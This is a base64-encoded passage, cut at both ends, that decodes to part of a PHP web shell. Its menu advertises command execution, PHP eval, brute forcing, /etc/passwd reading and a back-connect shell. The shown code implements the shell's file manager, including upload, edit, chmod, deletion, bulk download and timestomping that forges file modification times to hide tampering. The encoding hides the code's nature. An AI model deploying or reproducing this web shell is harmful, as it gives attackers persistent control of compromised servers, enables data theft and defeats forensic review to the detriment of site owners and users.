UlsnUkVNT1RFX0FERFInXS4iPC9mb250PiI7Pz5dIDwvc3Bhbj4gICA8YnIgLz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS08YnIgLz4KCQkJCgkJCTxhIGhyZWY9ImphdmFzY3JpcHQ6Z29hY3Rpb24oJ2ZpbGUnKTsiPkZpbGUgTWFuYWdlcjwvYT4gfAoJCQk8YSBocmVmPSJqYXZhc2NyaXB0OmdvYWN0aW9uKCdzcWxhZG1pbicpOyI+TXlTUUwgTWFuYWdlcjwvYT4gfAoJCQk8YSBocmVmPSJqYXZhc2NyaXB0OmdvYWN0aW9uKCdzcWxmaWxlJyk7Ij5NeVNRTCBVcGxvYWQgJmFtcDsgRG93bmxvYWQ8L2E+IHwKCQkJPGEgaHJlZj0iamF2YXNjcmlwdDpnb2FjdGlvbignc2hlbGwnKTsiPkV4ZWN1dGUgQ29tbWFuZDwvYT4gfAoJCQk8YSBocmVmPSJqYXZhc2NyaXB0OmdvYWN0aW9uKCdwaHBlbnYnKTsiPlBIUCBWYXJpYWJsZTwvYT4gfAoJCQk8YSBocmVmPSJqYXZhc2NyaXB0OmdvYWN0aW9uKCdldmFsJyk7Ij5FdmFsIFBIUCBDb2RlPC9hPgoJCQk8P3BocCBpZiAoIUlTX1dJTikgez8+IHwgPGEgaHJlZj0iamF2YXNjcmlwdDpnb2FjdGlvbignYnJ1dGUnKTsiPkJydXRlPC9hPiA8P3BocCB9Pz4KCQkJPD9waHAgaWYgKCFJU19XSU4pIHs/PiB8IDxhIGhyZWY9ImphdmFzY3JpcHQ6Z29hY3Rpb24oJ2V0Y3B3ZCcpOyI+L2V0Yy9wYXNzd2Q8L2E+IDw/cGhwIH0/PgoJCQk8P3BocCBpZiAoIUlTX1dJTikgez8+IHwgPGEgaHJlZj0iamF2YXNjcmlwdDpnb2FjdGlvbignYmFja2Nvbm5lY3QnKTsiPkJhY2sgQ29ubmVjdDwvYT48P3BocCB9Pz4KCQk8L3RkPgoJPC90cj4KPC90YWJsZT4KPHRhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIxNSIgY2VsbHNwYWNpbmc9IjAiPjx0cj48dGQ+Cjw/cGhwCgpmb3JtaGVhZChhcnJheSgnbmFtZSc9Pidnb2FjdGlvbicpKTsKbWFrZWhpZGUoJ2FjdGlvbicpOwpmb3JtZm9vdCgpOwoKJGVycm1zZyAmJiBtKCRlcnJtc2cpOwoKLy8gRGlyIGZ1bmN0aW9uCiEkZGlyICYmICRkaXIgPSAnLic7CiRub3dwYXRoID0gZ2V0UGF0aChTQV9ST09ULCAkZGlyKTsKaWYgKHN1YnN0cigkZGlyLCAtMSkgIT0gJy8nKSB7CgkkZGlyID0gJGRpci4nLyc7Cn0KJHVlZGlyID0gdWUoJGRpcik7CgppZiAoISRhY3Rpb24gfHwgJGFjdGlvbiA9PSAnZmlsZScpIHsKCgkvLyBOb24td3JpdGVhYmxlCgkkZGlyX3dyaXRlYWJsZSA9IEBpc193cml0YWJsZSgkbm93cGF0aCkgPyAnV3JpdGFibGUnIDogJ05vbi13cml0YWJsZSc7CgoJLy8gRGVsZXRlIGRpcgoJaWYgKCRkb2luZyA9PSAnZGVsZGlyJyAmJiAkdGhlZmlsZSkgewoJCWlmICghZmlsZV9leGlzdHMoJHRoZWZpbGUpKSB7CgkJCW0oJHRoZWZpbGUuJyBkaXJlY3RvcnkgZG9lcyBub3QgZXhpc3QnKTsKCQl9IGVsc2UgewoJCQltKCdEaXJlY3RvcnkgZGVsZXRlICcuKGRlbHRyZWUoJHRoZWZpbGUpID8gYmFzZW5hbWUoJHRoZWZpbGUpLicgc3VjY2VzcycgOiAnZmFpbGVkJykpOwoJCX0KCX0KCgkvLyBDcmVhdGUgbmV3IGRpcgoJZWxzZWlmICgkbmV3ZGlybmFtZSkgewoJCSRta2RpcnMgPSAkbm93cGF0aC4kbmV3ZGlybmFtZTsKCQlpZiAoZmlsZV9leGlzdHMoJG1rZGlycykpIHsKCQkJbSgnRGlyZWN0b3J5IGhhcyBhbHJlYWR5IGV4aXN0ZWQnKTsKCQl9IGVsc2UgewoJCQltKCdEaXJlY3RvcnkgY3JlYXRlZCAnLihAbWtkaXIoJG1rZGlycywwNzc3KSA/ICdzdWNjZXNzJyA6ICdmYWlsZWQnKSk7CgkJCUBjaG1vZCgkbWtkaXJzLDA3NzcpOwoJCX0KCX0KCgkvLyBVcGxvYWQgZmlsZQoJZWxzZWlmICgkZG91cGZpbGUpIHsKCQltKCdGaWxlIHVwbG9hZCAnLihAY29weSgkX0ZJTEVTWyd1cGxvYWRmaWxlJ11bJ3RtcF9uYW1lJ10sJHVwbG9hZGRpci4nLycuJF9GSUxFU1sndXBsb2FkZmlsZSddWyduYW1lJ10pID8gJ3N1Y2Nlc3MnIDogJ2ZhaWxlZCcpKTsKCX0KCgkvLyBFZGl0IGZpbGUKCWVsc2VpZiAoJGVkaXRmaWxlbmFtZSAmJiAkZmlsZWNvbnRlbnQpIHsKCQkkZnAgPSBAZm9wZW4oJGVkaXRmaWxlbmFtZSwndycpOwoJCW0oJ1NhdmUgZmlsZSAnLihAZndyaXRlKCRmcCwkZmlsZWNvbnRlbnQpID8gJ3N1Y2Nlc3MnIDogJ2ZhaWxlZCcpKTsKCQlAZmNsb3NlKCRmcCk7Cgl9CgoJLy8gTW9kaWZ5CgllbHNlaWYgKCRwZmlsZSAmJiAkbmV3cGVybSkgewoJCWlmICghZmlsZV9leGlzdHMoJHBmaWxlKSkgewoJCQltKCdUaGUgb3JpZ2luYWwgZmlsZSBkb2VzIG5vdCBleGlzdCcpOwoJCX0gZWxzZSB7CgkJCSRuZXdwZXJtID0gYmFzZV9jb252ZXJ0KCRuZXdwZXJtLDgsMTApOwoJCQltKCdNb2RpZnkgZmlsZSBhdHRyaWJ1dGVzICcuKEBjaG1vZCgkcGZpbGUsJG5ld3Blcm0pID8gJ3N1Y2Nlc3MnIDogJ2ZhaWxlZCcpKTsKCQl9Cgl9CgoJLy8gUmVuYW1lCgllbHNlaWYgKCRvbGRuYW1lICYmICRuZXdmaWxlbmFtZSkgewoJCSRubmFtZSA9ICRub3dwYXRoLiRuZXdmaWxlbmFtZTsKCQlpZiAoZmlsZV9leGlzdHMoJG5uYW1lKSB8fCAhZmlsZV9leGlzdHMoJG9sZG5hbWUpKSB7CgkJCW0oJG5uYW1lLicgaGFzIGFscmVhZHkgZXhpc3RlZCBvciBvcmlnaW5hbCBmaWxlIGRvZXMgbm90IGV4aXN0Jyk7CgkJfSBlbHNlIHsKCQkJbShiYXNlbmFtZSgkb2xkbmFtZSkuJyByZW5hbWVkICcuYmFzZW5hbWUoJG5uYW1lKS4oQHJlbmFtZSgkb2xkbmFtZSwkbm5hbWUpID8gJyBzdWNjZXNzJyA6ICdmYWlsZWQnKSk7CgkJfQoJfQoKCS8vIENvcHUKCWVsc2VpZiAoJHNuYW1lICYmICR0b2ZpbGUpIHsKCQlpZiAoZmlsZV9leGlzdHMoJHRvZmlsZSkgfHwgIWZpbGVfZXhpc3RzKCRzbmFtZSkpIHsKCQkJbSgnVGhlIGdvYWwgZmlsZSBoYXMgYWxyZWFkeSBleGlzdGVkIG9yIG9yaWdpbmFsIGZpbGUgZG9lcyBub3QgZXhpc3QnKTsKCQl9IGVsc2UgewoJCQltKGJhc2VuYW1lKCR0b2ZpbGUpLicgY29waWVkICcuKEBjb3B5KCRzbmFtZSwkdG9maWxlKSA/IGJhc2VuYW1lKCR0b2ZpbGUpLicgc3VjY2VzcycgOiAnZmFpbGVkJykpOwoJCX0KCX0KCgkvLyBGaWxlIGV4aXQKCWVsc2VpZiAoJGN1cmZpbGUgJiYgJHRhcmZpbGUpIHsKCQlpZiAoIUBmaWxlX2V4aXN0cygkY3VyZmlsZSkgfHwgIUBmaWxlX2V4aXN0cygkdGFyZmlsZSkpIHsKCQkJbSgnVGhlIGdvYWwgZmlsZSBoYXMgYWxyZWFkeSBleGlzdGVkIG9yIG9yaWdpbmFsIGZpbGUgZG9lcyBub3QgZXhpc3QnKTsKCQl9IGVsc2UgewoJCQkkdGltZSA9IEBmaWxlbXRpbWUoJHRhcmZpbGUpOwoJCQltKCdNb2RpZnkgZmlsZSB0aGUgbGFzdCBtb2RpZmllZCAnLihAdG91Y2goJGN1cmZpbGUsJHRpbWUsJHRpbWUpID8gJ3N1Y2Nlc3MnIDogJ2ZhaWxlZCcpKTsKCQl9Cgl9CgoJLy8gRGF0ZQoJZWxzZWlmICgkY3VyZmlsZSAmJiAkeWVhciAmJiAkbW9udGggJiYgJGRheSAmJiAkaG91ciAmJiAkbWludXRlICYmICRzZWNvbmQpIHsKCQlpZiAoIUBmaWxlX2V4aXN0cygkY3VyZmlsZSkpIHsKCQkJbShiYXNlbmFtZSgkY3VyZmlsZSkuJyBkb2VzIG5vdCBleGlzdCcpOwoJCX0gZWxzZSB7CgkJCSR0aW1lID0gc3RydG90aW1lKCIkeWVhci0kbW9udGgtJGRheSAkaG91cjokbWludXRlOiRzZWNvbmQiKTsKCQkJbSgnTW9kaWZ5IGZpbGUgdGhlIGxhc3QgbW9kaWZpZWQgJy4oQHRvdWNoKCRjdXJmaWxlLCR0aW1lLCR0aW1lKSA/ICdzdWNjZXNzJyA6ICdmYWlsZWQnKSk7CgkJfQoJfQoKCS8vIERvd25sb2FkCgllbHNlaWYoJGRvaW5nID09ICdkb3ducmFyJykgewoJCWlmICgkZGwpIHsKCQkJJGRmaWxlcz0nJzsKCQkJZm9yZWFjaCAoJGRsIGFzICRmaWxlcGF0aCA9PiAkdmFsdWUpIHsKCQkJCSRkZmlsZXMuPSRmaWxlcGF0aC4nLCc7CgkJCX0KCQkJJGRmaWxlcz1zdWJzdHIoJGRmaWxlcywwLHN0cmxlbigkZGZpbGVzKS0xKTsKCQkJJGRsPWV4cGxvZGUoJywnLCRkZmlsZXMpOwoJCQkkemlwPW5ldyBQSFBaaXAoJGRsKTsKCQkJJGNvZGU9JHppcC0+b3V0OwoJCQloZWFkZXIoJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJyk7CgkJCWhlYWRlcignQWNjZXB0LVJhbmdlczogYnl0ZXMnKTsKCQkJaGVhZGVyKCdBY2NlcHQtTGVuZ3RoOiAnLnN0cmxlbigkY29kZSkpOwoJCQloZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7ZmlsZW5hbWU9Jy4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJ19GaWxlcy50YXIuZ3onKTsKCQkJZWNobyAkY29kZTsKCQkJZXhpdDsKCQl9IGVsc2UgewoJCQltKCdQbGVhc2Ugc2VsZWN0IGZpbGUocyknKTsKCQl9Cgl9CgoJLy8gRGVsZXRlIGZpbGUKCWVsc2VpZigkZG9pbmcgPT0gJ2RlbGZpbGVzJykgewoJCWlmICgkZGwpIHsKCQkJJGRmaWxlcz0nJzsKCQkJJHN1Y2MgPSAkZmFpbCA9IDA7CgkJCWZvcmVhY2ggKCRkbCBhcyAkZmlsZXBhdGggPT4gJHZhbHVlKSB7CgkJCQlpZiAoQHVubGluaygkZmlsZXBhdGgpKSB7CgkJCQkJJHN1Y2MrKzsKCQkJCX0gZWxzZSB7CgkJCQkJJGZhaWwrKzsKCQkJCX0KCQkJfQoJCQltKCdEZWxldGVkIGZpbGUgaGF2ZSBmaW5pc2hlZD8/Y2hvb3NlICcuY291bnQoJGRsKS4nIHN1Y2Nlc3MgJy4kc3VjYy4nIGZhaWwgJy4kZmFpbCk7CgkJfSBlbHNlIHsKCQkJbSgnUGxlYXNlIHNlbGVjdCBmaWxlKHMpJyk7CgkJfQoJfQoKCS8vIEZ1bmN0aW9uIE5ld2RpcgoJZm9ybWhlYWQoYXJyYXkoJ25hbWUnPT4nY3JlYXRlZGlyJykpOwoJbWFrZWhpZGUoJ25ld2Rpcm5hbWUnKTsKCW1ha2VoaWRlKCdkaXInLCRub3dwYXRoKTsKCWZvcm1mb290KCk7Cglmb3JtaGVhZChhcnJheSgnbmFtZSc9PidmaWxlcGVybScpKTsKCW1ha2VoaWRlKCduZXdwZXJtJyk7CgltYWtlaGlkZSgncGZpbGUnKTsKCW1ha2VoaWRlKCdkaXInLCRub3dwYXRoKTsKCWZvcm1mb290KCk7Cglmb3JtaGVhZChhcnJheSgnbmFtZSc9Pidjb3B5ZmlsZScpKTsKCW1ha2VoaWRlKCdzbmFtZScpOwoJbWFrZWhpZGUoJ3RvZmlsZScpOwoJbWFrZWhpZGUoJ2RpcicsJG5vd3BhdGgpOwoJZm9ybWZvb3QoKTsKCWZvcm1oZWFkKGFycmF5KCduYW1lJz0+J3JlbmFtZScpKTsKCW1ha2VoaWRlKCdvbGRuYW1lJyk7CgltYWtlaGlkZSgnbmV3ZmlsZW5hbWUnKTsKCW1ha2VoaWRlKCdkaXInLCRub3dwYXRoKTsKCWZvcm1mb290KCk7Cglmb3JtaGVhZChhcnJheSgnbmFtZSc9PidmaWxlb3Bmb3JtJykpOwoJbWFrZWhpZGUoJ2FjdGlvbicpOwoJbWFrZWhpZGUoJ29wZmlsZScpOwoJbWFrZWhpZGUoJ2RpcicpOwoJZm9ybWZvb3QoKTsKCgkkZnJlZSA9IEBkaXNrX2ZyZWVfc3BhY2UoJG5vd3BhdGgpOwoJISRmcmVlICYmICRmcmVlID0gMDsKCSRhbGwgPSBAZGlza190b3RhbF9zcGFjZSgkbm93cGF0aCk7CgkhJGFsbCAmJiAkYWxsID0gMDsKCSR1c2VkID0gJGFsbC0kZnJlZTsKCSR1c2VkX3BlcmNlbnQgPSBAcm91bmQoMTAwLygkYWxsLyRmcmVlKSwyKTsKCXAoJzxmb250IGNvbG9yPXllbGxvdyBmYWNlPXRhaG9tYSBzaXplPTI+PEI+RmlsZSBNYW5hZ2VyPC9iPiA8L2ZvbnQ+IEN1cnJlbnQgZGlzayBmcmVlIDxmb250IGNvbG9yPXJlZD4nLnNpemVjb3VudCgkZnJlZSkuJzwvZm9udD4gb2YgPGZvbnQgY29sb3I9cmVkPicuc2l6ZWNvdW50KCRhbGwpLic8L2ZvbnQ+ICg8Zm9udCBjb2xvcj1yZWQ+Jy4kdXNlZF9wZXJjZW50Lic8L2ZvbnQ+JSk8L2ZvbnQ+Jyk7Cgo/Pgo8dGFibGUgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIiBzdHlsZT0ibWFyZ2luOjEwcHggMDsiPgogIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGlkPSJnb2RpciIgbmFtZT0iZ29kaXIiPgogIDx0cj4KICAgIDx0ZCBub3dyYXA+Q3VycmVudCBEaXJlY3RvcnkgKDw/cGhwIGVjaG8gJGRpcl93cml0ZWFibGU7Pz4sIDw/cGhwIGVjaG8gZ2V0Q2htb2QoJG5vd3BhdGgpOz8+KTwvdGQ+Cgk8dGQgd2lkdGg9IjEwMCUiPjxpbnB1dCBuYW1lPSJ2aWV3X3dyaXRhYmxlIiB2YWx1ZT0iMCIgdHlwZT0iaGlkZGVuIiAvPjxpbnB1dCBjbGFzcz0iaW5wdXQiIG5hbWU9ImRpciIgdmFsdWU9Ijw/cGhwIGVjaG8gJG5vd3BhdGg7Pz4iIHR5cGU9InRleHQiIHN0eWxlPSJ3aWR0aDoxMDAlO21hcmdpbjowIDhweDsiPjwvdGQ+CiAgICA8dGQgbm93cmFwPjxpbnB1dCBjbGFzcz0iYnQiIHZhbHVlPSJHTyIgdHlwZT0ic3VibWl0Ij48L3RkPgogIDwvdHI+CiAgPC9mb3JtPgo8L3RhYmxlPgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CmZ1bmN0aW9uIGNyZWF0ZWRpcigpewoJdmFyIG5ld2Rpcm5hbWU7CgluZXdkaXJuYW1lID0gcHJvbXB0KCdQbGVhc2UgaW5wdXQgdGhlIGRpcmVjdG9yeSBuYW1lOicsICcnKTsKCWlmICghbmV3ZGlybmFtZSkgcmV0dXJuOwoJJCgnY3JlYXRlZGlyJykubmV3ZGlybmFtZS52YWx1ZT1uZXdkaXJuYW1lOwoJJCgnY3JlYXRlZGlyJykuc3VibWl0KCk7Cn0KZnVuY3Rpb24gZmlsZXBlcm0ocGZpbGUpewoJdmFyIG5ld3Blcm07CgluZXdwZXJtID0gcHJvbXB0KCdDdXJyZW50IGZpbGU6JytwZmlsZSsnXG5QbGVhc2UgaW5wdXQgbmV3IGF0dHJpYnV0ZTonLCAnJyk7CglpZiAoIW5ld3Blcm0pIHJldHVybjsKCSQoJ2ZpbGVwZXJtJykubmV3cGVybS52YWx1ZT1uZXdwZXJtOwoJJCgnZmlsZXBlcm0nKS5wZmlsZS52YWx1ZT1wZmlsZTsKCSQoJ2ZpbGVwZXJtJykuc3VibWl0KCk7Cn0KZnVuY3Rpb24gY29weWZpbGUoc25hbWUpewoJdmFyIHRvZmlsZTsKCXRvZmlsZSA9IHByb21wdCgnT3JpZ2luYWwgZmlsZTonK3NuYW1lKydcblBsZWFzZSBpbnB1dCBvYmplY3QgZmlsZSAoZnVsbHBhdGgpOicsICcnKTsKCWlmICghdG9maWxlKSByZXR1cm47CgkkKCdjb3B5ZmlsZScpLnRvZmlsZS52YWx1ZT10b2ZpbGU7CgkkKCdjb3B5ZmlsZScpLnNuYW1lLnZhbHVlPXNuYW1lOwoJJCgnY29weWZpbGUnKS5zdWJtaXQoKTsKfQpmdW5jdGlvbiByZW5hbWUob2xkbmFtZSl7Cgl2YXIgbmV3ZmlsZW5hbWU7CgluZXdmaWxlbmFtZSA9IHByb21wdCgnRm9ybWVyIGZpbGUgbmFtZTonK29sZG5hbWUrJ1xuUGxlYXNlIGlucHV0IG5ldyBmaWxlbmFtZTonLCAnJyk7CglpZiAoIW5ld2ZpbGVuYW1lKSByZXR1cm47CgkkKCdyZW5hbWUnKS5uZXdmaWxlbmFtZS52YWx1ZT1uZXdmaWxlbmFtZTsKCSQoJ3JlbmFtZScpLm9sZG5hbWUudmFsdWU9b2xkbmFtZTsKCSQoJ3JlbmFtZScpLnN1Ym1pdCgpOwp9CmZ1bmN0aW9uIGRvZmlsZShkb2luZyx0aGVmaWxlLG0pewoJaWYgKG0gJiYgIWNvbmZpcm0obSkpIHsKCQlyZXR1cm47Cgl9CgkkKCdmaWxlbGlzdCcpLmRvaW5nLnZhbHVlPWRvaW5nOwoJaWYgKHRoZWZpbGUpewoJCSQoJ2ZpbGVsaXN0JykudGhlZmlsZS52YWx1ZT10aGVmaWxlOwoJfQoJJCgnZmlsZWxpc3QnKS5zdWJtaXQoKTsKfQpmdW5jdGlvbiBjcmVhdGVmaWxlKG5vd3BhdGgpewoJdmFyIGZpbGVuYW1lOwoJZmlsZW5hbWUgPSBwcm9tcHQoJ1BsZWFzZSBpbnB1dCB0aGUgZmlsZSBuYW1lOicsICcnKTsKCWlmICghZmlsZW5hbWUpIHJldHVybjsKCW9wZmlsZSgnZWRpdGZpbGUnLG5vd3BhdGggKyBmaWxlbmFtZSxub3dwYXRoKTsKfQpmdW5jdGlvbiBvcGZpbGUoYWN0aW9uLG9wZmlsZSxkaXIpewoJJCgnZmlsZW9wZm9ybScpLmFjdGlvbi52YWx1ZT1hY3Rpb247CgkkKCdmaWxlb3Bmb3JtJykub3BmaWxlLnZhbHVlPW9wZmlsZTsKCSQoJ2ZpbGVvcGZvcm0nKS5kaXIudmFsdWU9ZGlyOwoJJCgnZmlsZW9wZm9ybScpLnN1Ym1pdCgpOwp9CmZ1bmN0aW9uIGdvZGlyKGRpcix2aWV3X3dyaXRhYmxlKXsKCWlmICh2aWV3X3dyaXRhYmxlKSB7CgkJJCgnZ29kaXInKS52aWV3X3dyaXRhYmxlLnZhbHVlPTE7Cgl9CgkkKCdnb2RpcicpLmRpci52YWx1ZT1kaXI7CgkkKCdnb2RpcicpLnN1Ym1pdCgpOwp9Cjwvc2NyaXB0PgogIDw/cGhwCgl0YmhlYWQoKTsKCXAoJzxmb3JtIGFjdGlvbj0iJy4kc2VsZi4nIiBtZXRob2Q9IlBPU1QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPjx0ciBjbGFzcz0iYWx0MSI+PHRkIGNvbHNwYW49IjciIHN0eWxlPSJwYWRkaW5nOjVweDsiPicpOwoJcCgnPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7Ij48aW5wdXQgY2xhc3M9ImlucHV0IiBuYW1lPSJ1cGxvYWRmaWxlIiB2YWx1ZT0iIiB0eXBlPSJmaWxlIiAvPiA8aW5wdXQgY2xhc3M9IiIgbmFtZT0iZG91cGZpbGUiIHZhbHVlPSJVcGxvYWQiIHR5cGU9InN1Ym1pdCIgLz48aW5wdXQgbmFtZT0idXBsb2FkZGlyIiB2YWx1ZT0iJy4kZGlyLiciIHR5cGU9ImhpZGRlbiIgLz48aW5wdXQgbmFtZT0iZGlyIiB2YWx1ZT0iJy4kZGlyLiciIHR5cGU9ImhpZGRlbiIgLz48L2Rpdj4nKTsKCXAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6Z29kaXIoXCcnLiRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl0uJ1wnKTsiPldlYlJvb3Q8L2E+Jyk7CglpZiAoJHZpZXdfd3JpdGFibGUpIHsKCQlwKCcgfCA8YSBocmVmPSJqYXZhc2NyaXB0OmdvZGlyKFwnJy4kbm93cGF0aC4nXCcpOyI+VmlldyBBbGw8L2E+Jyk7Cgl9IGVsc2UgewoJCXAoJyB8IDxhIGhyZWY9ImphdmFzY3JpcHQ6Z29kaXIoXCcnLiRub3dwYXRoLidcJyxcJzFcJyk7Ij5WaWV3IFdyaXRhYmxlPC9hPicpOwoJfQoJcCgnIHwgPGEgaHJlZj0iamF2YXNjcmlwdDpjcmVhdGVkaXIoKTsiPkNyZWF0ZSBEaXJlY3Rvcnk8L2E+IHwgPGEgaHJlZj0iamF2YXNjcmlwdDpjcmVhdGVmaWxlKFwnJy4kbm93cGF0aC4nXCcpOyI+Q3JlYXRlIEZpbGU8L2E+Jyk7CglpZiAoSVNfV0lOICYmIElTX0NPTSkgewoJCSRvYmogPSBuZXcgQ09NKCdzY3JpcHRpbmcuZmlsZXN5c3RlbW9iamVjdCcpOwoJCWlmICgkb2JqICYmIGlzX29iamVjdCgkb2JqKSkgewoJCQkkRHJpdmVUeXBlREIgPSBhcnJheSgwID0+ICdVbmtub3cnLDEgPT4gJ1JlbW92YWJsZScsMiA9PiAnRml4ZWQnLDMgPT4gJ05ldHdvcmsnLDQgPT4gJ0NEUm9tJyw1ID0+ICdSQU0gRGlzaycpOwoJCQlmb3JlYWNoKCRvYmotPkRyaXZlcyBhcyAkZHJpdmUpIHsKCQkJCWlmICgkZHJpdmUtPkRyaXZlVHlwZSA9PSAyKSB7CgkJCQkJcCgnIHwgPGEgaHJlZj0iamF2YXNjcmlwdDpnb2RpcihcJycuJGRyaXZlLT5QYXRoLicvXCcpOyIgdGl0bGU9IlNpemU6Jy5zaXplY291bnQoJGRyaXZlLT5Ub3RhbFNpemUpLicmIzEzO0ZyZWU6Jy5zaXplY291bnQoJGRyaXZlLT5GcmVlU3BhY2UpLicmIzEzO1R5cGU6Jy4kRHJpdmVUeXBlREJbJGRyaXZlLT5Ecml2ZVR5cGVdLiciPicuJERyaXZlVHlwZURCWyRkcml2ZS0+RHJpdmVUeXBlXS4nKCcuJGRyaXZlLT5QYXRoLicpPC9hPicpOwoJCQkJfSBlbHNlIHsKCQkJCQlwKCcgfCA8YSBocmVmPSJqYXZhc2NyaXB0OmdvZGlyKFwnJy4kZHJpdmUtPlBhdGguJy9cJyk7IiB0aXRsZT0iVHlwZTonLiREcml2ZVR5cGVEQlskZHJpdmUtPkRyaXZlVHlwZV0uJyI+Jy4kRHJpdmVUeXBlREJbJGRyaXZlLT5Ecml2ZVR5cGVdLicoJy4kZHJpdmUtPlBhdGguJyk8L2E+Jyk7CgkJCQl9CgkJCX0KCQl9Cgl9CgoJcCgnPC90ZD48L3RyPjwvZm9ybT4nKTsKCglwKCc8dHIgY2xhc3M9ImhlYWQiPjx0ZD4mbmJzcDs8L3RkPjx0ZD5GaWxlbmFtZTwvdGQ+PHRkIHdpZHRoPSIxNiUiPkxhc3QgbW9kaWZpZWQ8L3RkPjx0ZCB3aWR0aD0iMTAlIj5TaXplPC90ZD48dGQgd2lkdGg9IjIwJSI+Q2htb2QgLyBQZXJtczwvdGQ+PHRkIHdpZHRoPSIyMiUiPkFjdGlvbjwvdGQ+PC90cj4nKTsKCgkvLyBHZXQgcGF0aAoJJGRpcmRhdGE9YXJyYXkoKTsKCSRmaWxlZGF0YT1hcnJheSgpOwoKCWlmICgkdmlld193cml0YWJsZSkgewoJCSRkaXJkYXRhID0gR2V0TGlzdCgkbm93cGF0aCk7Cgl9IGVsc2UgewoJCS8vIE9wZW4gZGlyCgkJJGRpcnM9QG9wZW5kaXIoJGRpcik7CgkJd2hpbGUgKCRmaWxlPUByZWFkZGlyKCRkaXJzKSkgewoJCQkkZmlsZXBhdGg9JG5vd3BhdGguJGZpbGU7CgkJCWlmKEBpc19kaXIoJGZpbGVwYXRoKSl7CgkJCQkkZGlyZGJbJ2ZpbGVuYW1lJ109JGZpbGU7CgkJCQkkZGlyZGJbJ210aW1lJ109QGRhdGUoJ1ktbS1kIEg6aTpzJyxmaWxlbXRpbWUoJGZpbGVwYXRoKSk7CgkJCQkkZGlyZGJbJ2RpcmNobW9kJ109Z2V0Q2htb2QoJGZpbGVwYXRoKTsKCQkJCSRkaXJkYlsnZGlycGVybSddPWdldFBlcm1zKCRmaWxlcGF0aCk7CgkJCQkkZGlyZGJbJ2ZpbGVvd25lciddPWdldFVzZXIoJGZpbGVwYXRoKTsKCQkJCSRkaXJkYlsnZGlybGluayddPSRub3dwYXRoOwoJCQkJJGRpcmRiWydzZXJ2ZXJfbGluayddPSRmaWxlcGF0aDsKCQkJCSRkaXJkYlsnY2xpZW50X2xpbmsnXT11ZSgkZmlsZXBhdGgpOwoJCQkJJGRpcmRhdGFbXT0kZGlyZGI7CgkJCX0gZWxzZSB7CgkJCQkkZmlsZWRiWydmaWxlbmFtZSddPSRmaWxlOwoJCQkJJGZpbGVkYlsnc2l6ZSddPXNpemVjb3VudChAZmlsZXNpemUoJGZpbGVwYXRoKSk7CgkJCQkkZmlsZWRiWydtdGltZSddPUBkYXRlKCdZLW0tZCBIOmk6cycsZmlsZW10aW1lKCRmaWxlcGF0aCkpOwoJCQkJJGZpbGVkYlsnZmlsZWNobW9kJ109Z2V0Q2htb2QoJGZpbGVwYXRoKTsKCQkJCSRmaWxlZGJbJ2ZpbGVwZXJtJ109Z2V0UGVybXMoJGZpbGVwYXRoKTsKCQkJCSRmaWxlZGJbJ2ZpbGVvd25lciddPWdldFVzZXIoJGZpbGVwYXRoKTsKCQkJCSRmaWxlZGJbJ2RpcmxpbmsnXT0kbm93cGF0aDsKCQkJCSRmaWxlZGJbJ3NlcnZlcl9saW5rJ109JGZpbGVwYXRoOwoJCQkJJGZpbGVkYlsnY2xpZW50X2xpbmsnXT11ZSgkZmlsZXBhdGgpOwoJCQkJJGZpbGVkYXRhW109JGZpbGVkYjsKCQkJfQoJCX0vLyB3aGlsZQoJCXVuc2V0KCRkaXJkYik7CgkJdW5zZXQoJGZpbGVkYik7CgkJQGNsb3NlZGlyKCRkaXJzKTsKCX0KCUBzb3J0KCRkaXJkYXRhKTsKCUBzb3J0KCRmaWxlZGF0YSk7CgkkZGlyX2kgPSAnMCc7Cglmb3JlYWNoKCRkaXJkYXRhIGFzICRrZXkgPT4gJGRpcmRiKXsKCQlpZigkZGlyZGJbJ2ZpbGVuYW1lJ10hPScuLicgJiYgJGRpcmRiWydmaWxlbmFtZSddIT0nLicpIHsKCQkJJHRoaXNiZyA9IGJnKCk7CgkJCXAoJzx0ciBjbGFzcz0iZm91dCIgb25tb3VzZW92ZXI9InRoaXMuY2xhc3NOYW1lPVwnZm9jdXNcJzsiIG9ubW91c2VvdXQ9InRoaXMuY2xhc3NOYW1lPVwnZm91dFwnOyI+Jyk7CgkJCXAoJzx0ZCB3aWR0aD0iMiUiIG5vd3JhcD48Zm9udCBmYWNlPSJ3aW5nZGluZ3MiIHNpemU9IjMiPjA8L2ZvbnQ+PC90ZD4nKTsKCQkJcCgnPHRkPjxhIGhyZWY9ImphdmFzY3JpcHQ6Z29kaXIoXCcnLiRkaXJkYlsnc2VydmVyX2xpbmsnXS4nXCcpOyI+Jy4kZGlyZGJbJ2ZpbGVuYW1lJ10uJzwvYT48L3RkPicpOwoJCQlwKCc8dGQgbm93cmFwPicuJGRpcmRiWydtdGltZSddLic8L3RkPicpOwoJCQlwKCc8dGQgbm93cmFwPi0tPC90ZD4nKTsKCQkJcCgnPHRkIG5vd3JhcD4nKTsKCQkJcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpmaWxlcGVybShcJycuJGRpcmRiWydzZXJ2ZXJfbGluayddLidcJyk7Ij4nLiRkaXJkYlsnZGlyY2htb2QnXS4nPC9hPiAvICcpOwoJCQlwKCc8YSBocmVmPSJqYXZhc2NyaXB0OmZpbGVwZXJtKFwnJy4kZGlyZGJbJ3NlcnZlcl9saW5rJ10uJ1wnKTsiPicuJGRpcmRiWydkaXJwZXJtJ10uJzwvYT4nLiRkaXJkYlsnZmlsZW93bmVyJ10uJzwvdGQ+Jyk7CgkJCXAoJzx0ZCBub3dyYXA+PGEgaHJlZj0